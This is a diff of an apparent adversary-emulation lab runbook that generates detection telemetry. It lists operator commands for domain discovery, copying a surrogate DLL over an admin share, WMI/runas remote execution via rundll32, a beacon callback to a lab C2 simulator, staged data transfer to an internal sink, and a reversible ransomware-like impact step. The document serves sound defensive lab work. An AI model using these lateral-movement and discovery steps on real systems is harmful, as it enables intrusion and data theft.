@@ -79,98 +79,166 @@ powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .
 - Sysmon E1 on WS01: `WINWORD -> cmd -> mshta -> regsvr32 -> powershell` ancestry; E11 for the files;
   E3 to `192.168.50.1:8000/8080`; E7 ImageLoad of the DLL only if the CAPTURE profile is loaded.
 
-## Part B — S4: discovery (operator, via C2-SIM task batch) — READY
+## Part B — S4: discovery (operator-driven, beacon executes on WS01)
 
-The beacon executes the DFIR discovery batch on WS01 (parent chain = beacon). The operator only
-drives it through the C2 channel. The C2-SIM serves these tasks once, in order, then idles:
+Working style: operator stays on the C2 host and SHEPHERDS the beacon; the commands run
+on WS01 (parent chain = beacon powershell PID of session 1). The C2-SIM serves the DFIR
+batch once, in order, then idles on T-BEACON-SLEEP.
 
-`net view /all` (T1135) · `tasklist /s` (T1057) · `net group "domain admins" /dom` (T1069.002) ·
-`net localgroup "administrator"` (T1069.001) · `nltest /domain_trusts /all_trusts` (T1482) ·
-`net view /all /domain` (T1018) · `net view /all time` (T1124) · `ping FS01` (T1018).
+Prereq (critical): the deployed `config.ini` on WS01 must map ALL 8 discovery tasks.
+Regenerate with the CURRENT make_config, otherwise the beacon falls back to `cmd /c ver`
+(observed: RUN-20261001-01, S4 CORPUS only — see ledger). Then re-stage + reopen the docm.
 
-- With session 1 active, the beacon loops through the batch automatically (config `loop_count=12`
-  default). Watch `c2sim.log` for the 8 `task/next ... result ... ok=True` lines.
-- Verify on WS01: Sysmon E1 for each command with parent = `powershell`/beacon.
-- Record the observed outputs (esp. shares) — they feed S5.
-
-## Part C — S5..S6: share artifact and target decision
-
+On WS01 / C2 host — verify the batch ran (8 results accepted):
 ```powershell
-# S5 (on WS01, operator context): enumerate shares read-only -> found_shares artifact
-net view \\FS01
-Get-SmbShare | Out-File C:\ProgramData\found_shares.txt   # mirror DFIR staging path (LAB-SURROGATE)
-# build ART-04-01 (structured discovery result) with lab_tools
-python scripts/lab_tools.py artifact-new ART-04-01 <run_id> 5 6 --payload found_shares.json -o art04_01.json
-
-# S6 (orchestrator on C2 host): READ ART-04-01 -> choose target -> ART-04-02
-python scripts/lab_tools.py artifact-new ART-04-02 <run_id> 6 8 --payload target-manifest.json -o art04_02.json
+# C2 host: watch register + 8 task/result lines
+Get-Content c2sim.log -Tail 30
+# WS01 structured evidence incl. ParentProcessGuid
+powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json
 ```
-`ART-04-02` must derive `target.host=FS01` from `ART-04-01` content (no hardcode); record the reason.
+Expected WS01 E1 (parent = beacon `...3d08`): `net.exe view /all` (T1135),
+`tasklist.exe /s` (T1057), `cmd->net group "domain admins" /dom` (T1069.002),
+`cmd->net localgroup "administrator"` (T1069.001), `cmd->nltest /domain_trusts /all_trusts` (T1482),
+`cmd->net view /all /domain` (T1018), `cmd->net view /all time` (T1124), `cmd->ping FS01` (T1018).
 
-## Part D — S7..S8: auth context + WMI remote process (design; gate before running)
+Ledger row: stage S4, status `VERIFIED IN REPO` (8/8) with the E1 record_ids + c2sim task results.
 
-```powershell
-# S7 auth controls (operator, explicit credential; ART-05-01 = evidence, not control input)
-#   control A (denied):  duc.user -> FS01 denied
-#   control B (allowed): it.admin -> FS01 allowed (net use with prompt, never log the password)
-#   control C (revoked): revoked account -> denied
-net use \\FS01\IPC$ /user:C0015\it.admin *     # prompt; password never in command line/log
+## Operator playbook — S5..S9 (the "hands-on" operator phase)
 
-# S8a tool handoff (T1570 surrogate): copy the DLL to FS01 admin share
-copy C:\C0015\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\
+Working style identical to S1-S3: machine -> exact command -> input needed -> evidence to
+confirm -> ledger row. Operator runs on WS01 or the C2 host as indicated; NEVER more than
+what an operator can do interactively; credentials only via prompt/runas (never logged).
 
-# S8b WMI remote process creation with EXPLICIT credential (never the current token):
-runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
-#   fallback (telemetry differs): $cred=Get-Credential C0015\it.admin ; Invoke-CimMethod Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred -Arguments @{CommandLine="rundll32.exe ..."}
+### S5 — found_shares artifact (on WS01)
 ```
-Gate (4 questions, same run_id): process ran on FS01 (E1 wmiprvse->child); which identity
-(S4648 on WS01 + S4624/4672 on FS01, matching LogonId); which process (rundll32 + DLL hash); and the
-callback at S9. Identity proof = explicit-credential evidence, NOT the IPC$ session of S8a.
-
-## Part E — S9: second session (143.dll surrogate)
-
-The benign DLL on FS01 registers `phase7-session2` with the C2-SIM, which writes the server-side
-receipt `ART-07-01` (see `scripts/c2sim_v2.py`). Acceptance = receipt + FS01 callback telemetry in the
-same run. A marker or the DLL merely existing is NOT sufficient. Injection is NOT performed (S9b =
-analysis/replay only, fixtures in `scripts/fixtures/`).
-
-## Part F — S10..S11: collection, staging, transfer (two rounds with RDP between)
-
-```powershell
-# S10 (session 2 on FS01): read corpus, build ART-08-01 manifest with hashes/sizes
-python scripts/lab_tools.py manifest-new C:\Shares\IT <run_id> -o art08_01.json
-
-# S11a / S11b: transfer to internal sink (allowlist hash), two rounds; RDP (S12) between them
-#   sink (C2 host): run the repo sink and cross-check
-python scripts/lab_tools.py receipt-check <receipt.json> <manifest.json> <allowlist.json>
+Machine: WS01 (as duc.user, interactive)
+Input:   run_id (RUN-<yyyymmdd>-<seq>); session 1 active
+Commands:
+  net view \\FS01
+  Get-SmbShare | Out-File C:\ProgramData\found_shares.txt     # mirror DFIR staging path
+  # structured ART-04-01 (on C2 host where the repo lives):
+  python scripts/lab_tools.py artifact-new ART-04-01 <run_id> 5 6 --payload found_shares.json -o art04_01.json
+Expected evidence: E1 cmd/net view on WS01; E11 found_shares.txt; ART-04-01 created (sha256 recorded)
+Ledger: S5 = VERIFIED IN REPO if artifact hash + E1 exist
 ```
-Keep the source-order (round 1 -> RDP day 2 -> round 2 day 4). Chunked <=512 B transfer is DESIGN ONLY
-until the sink supports multi-chunk reassembly; current sink accepts a single allowlisted POST (<=1024 B).
-
-## Part G — S12..S14: RDP, AnyDesk-like + LSASS study, bounded impact
-
-```powershell
-# S12 RDP (native): mstsc /v:FS01 as it.admin; capture 4624 Type 10 / 4778 / 4779 (DET-008 to define)
-
-# S13 AnyDesk-like: install the legitimate portable app into an unusual path (e.g. C:\Users\Public\Videos\)
-#     and capture install/process/network telemetry. LSASS access study = ANALYSIS/REPLAY ONLY:
-#     a lab tool may open lsass.exe with PROCESS_QUERY_LIMITED_INFORMATION to produce E10 with access mask;
-#     high-rights patterns only in synthetic fixtures. No dump, no read, no credential.
-
-# S14 bounded impact (manifest-driven, allowlist corpus + restore):
-powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Prepare
-powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Run
-powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
-powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Rollback
-powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <impact-manifest.json> -Action Verify
+### S6 — target decision (orchestrator, on C2 host)
 ```
-Root is allowlisted per-run in the manifest; system roots / drive roots / reparse points are refused.
+Machine: C2 host (repo present)
+Input:   ART-04-01 (must be the actual file read, not hardcoded)
+Command: python scripts/lab_tools.py artifact-new ART-04-02 <run_id> 6 8 --payload target-manifest.json -o art04_02.json
+Decision rule: target.host = FS01 derived from ART-04-01 content (readable share) ; write selection_reason.
+Expected evidence: ledger step note (orchestration); artifact ART-04-02
+Ledger: S6 = VERIFIED if ART-04-02.target.host comes from ART-04-01 (provenance recorded)
+```
+### S7 — auth controls (WS01 -> FS01, explicit credential)
+```
+Machine: WS01 interactive (operator)
+Input:   it.admin pre-provisioned (not logged); ART-04-02.auth.account
+Run 3 control cases with net use (password via prompt, never on CLI/log):
+  A denied   : net use \\FS01\IPC$ /user:C0015\duc.user *   -> expect access denied
+  B allowed  : net use \\FS01\IPC$ /user:C0015\it.admin *   -> OK (this is control proof, NOT the WMI cred)
+  C revoked  : use a revoked/second account -> denied
+Record ART-05-01 (logon evidence bundle: S4648/S4624/4672 refs + LogonId) on C2 host.
+Architecture note: an IPC$ session does NOT change the process token; S8b must re-supply
+the credential explicitly (runas/CIM -Credential). ART-05-01 is EVIDENCE, not control input.
+Ledger: S7 = VERIFIED when denied/allowed/denied observed (4625/4624/4672) + LogonId linked
+```
+### S8a — tool handoff (T1570 surrogate, on WS01)
+```
+Machine: WS01 interactive
+Input:   staged DLL c0015_143_surrogate.dll present in C:\C0015\stage\
+Command: copy C:\C0015\stage\c0015_143_surrogate.dll \\FS01\C$\C0015\
+Expected evidence (FS01): S5140/S5145 (admin share), E11 TargetFilename C:\C0015\... ; hash continuity
+Ledger: S8 evidence (transfer) — separate from execution; do NOT infer transfer from process run
+```
+### S8b — WMI remote process creation (T1047, explicit credential; on WS01)
+```
+Machine: WS01 interactive (operator)
+Input:   ART-04-02 + explicit it.admin credential (runas prompt / Get-Credential)
+Command (primary, keeps wmic telemetry):
+  runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
+Fallback (telemetry differs = powershell, note PARTIAL):
+  $cred = Get-Credential C0015\it.admin
+  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -ComputerName FS01 -Credential $cred -Arguments @{CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'}
+Expected evidence:
+  WS01: S4648 (explicit credential) ; FS01: S4624 Type3 + S4672 + E1 wmiprvse->rundll32 + E7 ImageLoad (hash) + E11
+Gate (4): process on FS01 / which identity (S4648 + S4624/4672 same LogonId) / which process (+DLL hash) / callback S9
+Ledger: S8 = VERIFIED only when the 4-gate evidence set is present in the same run_id
+```
+### S9 — second session (143.dll surrogate; automatic after S8b trigger)
+```
+Machine: FS01 (DLL runs there) + C2 host writes the receipt
+After S8b, the benign DLL registers phase7-session2; C2-SIM writes server-side ART-07-01.
+Expected evidence: FS01 E3 -> 192.168.50.1:8080 (callback), ART-07-01 receipt artifact, FS01 E1/E7
+Acceptance: server-side receipt + callback telemetry in the run - marker/DLL present is NOT sufficient.
+Injection (S9b) is analysis/replay only (fixtures); never performed.
+Ledger: S9 = VERIFIED only with ART-07-01 + callback in same run
+```
 
-## Part H — S15: end-to-end (engineering + investigation)
+## Part E — S10..S11: collection, staging, transfer (operator commands)
 
-Run the full chain twice under ONE `run_id` each: an engineering run (runbook visible) and an
-investigation run (analyst sees only telemetry; ground truth hidden until reconstruction is done).
-Score the analyst reconstruction against the run ledger with `python scripts/lab_tools.py score`.
+### S10 — collection and staging (session 2 on FS01)
+```
+Machine: FS01 (session 2 = it.admin context)
+Input:   ART-07-01 receipt + ART-04-02.allowed_actions
+Commands:
+  # read the corpus (T1039: \\FS01\IT share for it.admin), then on the C2 host build the manifest:
+  python scripts/lab_tools.py manifest-new C:\Shares\IT <run_id> -o art08_01.json
+Expected evidence: FS01 S5145 (share access), E11 staging, manifest hash/bytes
+Ledger: S10 = VERIFIED with S5145 + manifest matching corpus
+```
+### S11a / S11b — transfer to internal sink (two rounds; RDP S12 between)
+```
+Machine: session 2 host -> sink (192.168.50.1:8081)
+Input:   ART-08-01 manifest; allowlist (hash+bytes, <=1024 single POST)
+Commands (C2 host, repo):
+  # POST the allowlisted corpus to the sink, then cross-check:
+  python scripts/lab_tools.py receipt-check <receipt.json> <manifest.json> <allowlist.json>
+Expected evidence: sink receipt ART-09-01 (r1/r2), E3 from the sender, hash continuity
+Ledger: S11 = VERIFIED with 2 receipts (r1, r2) + hash chain manifest==receipt==allowlist, same run_id
+Note: chunked <=512 B is DESIGN ONLY until the sink reassembles chunks.
+```
+
+## Part F — S12..S14: RDP, AnyDesk-like + LSASS study, bounded impact
+
+### S12 — RDP (native; mirror day 2)
+```
+Machine: WS01 or Kali -> FS01 (it.admin)
+Command: mstsc /v:FS01
+Expected evidence: S4624 Type 10, S4778/4779, TerminalServices session; DET-008 to define
+Ledger: S12 = VERIFIED with the RDP logon bundle
+```
+### S13 — AnyDesk-like + LSASS study
+```
+Machine: FS01; analysis/replay only for LSASS
+- AnyDesk-like: install a legitimate portable app into an unusual path (C:\Users\Public\Videos\)
+  and capture install/process/network telemetry.
+- LSASS: a lab tool may open lsass.exe with PROCESS_QUERY_LIMITED_INFORMATION to produce E10 + access
+  mask; high-rights patterns appear only in synthetic fixtures. No dump, no read, no credential.
+Ledger: S13 = VERIFIED when install telemetry exists; LSASS branch = ANALYSIS/REPLAY ONLY
+```
+### S14 — bounded impact + restore (on FS01, manifest-driven)
+```
+Input:   impact manifest (allowlist root, caps, note name, extension) - generated per run
+Commands (FS01 repo copy):
+  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Prepare
+  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Run
+  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Verify
+  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Rollback
+  powershell -ExecutionPolicy Bypass -File .\c0015_impact.ps1 -Manifest <manifest.json> -Action Verify
+Expected evidence: high-rate E11/E2/E26 on allowlist root, note file, restore count/hash/ACL diff
+Ledger: S14 = VERIFIED with restore-verify OK + no escape from the allowlist root
+```
+
+## Part G — S15: end-to-end (engineering + investigation)
+
+Run the full chain TWICE under ONE run_id each: an engineering run (runbook visible) and an
+investigation run (analyst sees only telemetry; ground truth hidden until reconstruction). Score
+the analyst reconstruction against the run ledger: `python scripts/lab_tools.py score`.
+
+Working style summary: every stage has `Machine:`, `Input:`, exact command(s), `Expected
+evidence`, `Ledger` row. Operator runs interactively; credentials only via prompt/runas; no
+command ever logs a password; handoff evidence is confirmed per-stage, never inferred.
 
 ## Cleanup (after each run)
 
@@ -182,6 +250,7 @@ Remove-Item -Recurse -Force C:\Users\Public\C0015 ; Remove-Item "$env:USERPROFIL
 # Re-enable Defender + restore routine Sysmon profile after the observation session.
 ```
 
-Status: S1-S3 VERIFIED on lab; S4 READY (task batch prepared); S5-S15 are operator/design steps with
-exact commands above; the chain is NOT end-to-end until one continuous run carries handoff evidence
-for every stage under a single run_id.
+Status: S1-S3 VERIFIED on lab (ledger RUN-20261001-01); S4 = CORPUS-only in that run (other tasks fell
+back to T-NOOP due to a stale config.ini - regenerate config per Part B before the next run); S5-S15 are
+operator/design steps with exact machine/command/evidence/ledger rows above; the chain is NOT end-to-end
+until one continuous run carries handoff evidence for every stage under a single run_id.
